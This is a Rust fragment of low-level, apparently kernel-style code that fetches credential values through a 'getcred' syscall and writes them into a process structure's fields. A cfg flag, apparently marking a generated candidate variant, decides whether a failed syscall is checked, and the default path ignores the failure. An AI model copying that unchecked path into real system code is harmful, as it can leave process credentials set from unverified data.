pub unsafe extern "C" fn getcred_body_result(
    raw_buf: *mut CInt,
    page_mask: CULong,
    syscall_nr: CInt,
    virt_to_phys_fn: Option<SyscallVirtToPhysFn>,
    processor_id_fn: Option<SyscallGetCpuFn>,
    do_syscall_fn: Option<SyscallRequestCallFn>,
) -> *mut CInt {
    if raw_buf.is_null() {
        return null_mut();
    }
    let Some(virt_to_phys) = virt_to_phys_fn else {
        return null_mut();
    };
    let Some(processor_id) = processor_id_fn else {
        return null_mut();
    };
    let Some(do_syscall) = do_syscall_fn else {
        return null_mut();
    };

    let alternate_buf = raw_buf.add(8);
    let selected_buf = if ((raw_buf as CULong) ^ (alternate_buf as CULong)) & page_mask != 0 {
        alternate_buf
    } else {
        raw_buf
    };

    let mut request = MaybeUninit::<SyscallRequest>::zeroed();
    let requestp = request.as_mut_ptr();
    (*requestp).number = syscall_nr as CULong;
    (*requestp).args[0] = virt_to_phys(selected_buf.cast::<c_void>());
    (*requestp).args[1] = 1;
    let result = do_syscall(requestp, processor_id());
    #[cfg(f03_credential_refresh_candidate)]
    if result != 0 { return null_mut(); }
    #[cfg(not(f03_credential_refresh_candidate))]
    let _ = result;

    selected_buf
}

pub unsafe extern "C" fn syscall_refresh_cred_fields_body_result(
    thread: *mut c_void,
    scratch: *mut CInt,
    thread_proc_offset: SizeT,
    field0_offset: SizeT,
    field1_offset: SizeT,
    field2_offset: SizeT,
    field3_offset: SizeT,
    value0_index: SizeT,
    value1_index: SizeT,
    value2_index: SizeT,
    value3_index: SizeT,
    getcred_fn: Option<SyscallGetcredFn>,
) -> CInt {
    if thread.is_null() || scratch.is_null() {
        return -EFAULT;
    }
    let Some(getcred) = getcred_fn else {
        return -EINVAL;
    };
    let values = getcred(scratch);
    if values.is_null() {
        return -EFAULT;
    }

    let proc = *(thread
        .cast::<u8>()
        .add(thread_proc_offset)
        .cast::<*mut c_void>());
    if proc.is_null() {
        return -EFAULT;
    }
    let proc_bytes = proc.cast::<u8>();
    write(
        proc_bytes.add(field0_offset).cast::<CInt>(),
        *values.add(value0_index),
    );
    write(
        proc_bytes.add(field1_offset).cast::<CInt>(),
        *values.add(value1_index),
    );
    write(
        proc_bytes.add(field2_offset).cast::<CInt>(),
        *values.add(value2_index),
    );
    write(
        proc_bytes.add(field3_offset).cast::<CInt>(),
        *values.add(value3_index),
    );

    0
}
